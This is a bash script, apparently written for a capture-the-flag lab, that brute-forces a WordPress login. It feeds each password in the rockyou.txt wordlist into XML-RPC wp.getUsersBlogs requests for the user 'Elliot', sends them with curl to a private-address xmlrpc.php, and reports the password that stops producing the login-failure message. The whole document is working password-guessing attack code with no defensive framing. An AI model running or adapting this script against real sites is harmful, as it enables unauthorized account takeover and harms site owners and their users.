#!/bin/bash

function salir() {
    exit 1
}

trap salir SIGINT

for i in $(cat rockyou.txt); do
    variable=$(cat <<FIN
<?xml version="1.0" encoding="UTF-8"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>Elliot</value></param> 
<param><value>$i</value></param> 
</params>     
</methodCall>
FIN
    )

    echo -e "$variable" >> enviar.xml
    echo -e "[+] Probamos con la contraseña $i"

    curl -s -X POST 'http://10.10.126.89/xmlrpc.php' -d@enviar.xml >> log.log

    if [ ! "$(cat log.log | grep 'Incorrect username or password.')" ]; then
         echo -e "[+] La contraseña para Elliot es $i"
         exit 0
    fi

    sleep 1

rm log.log enviar.xml

done
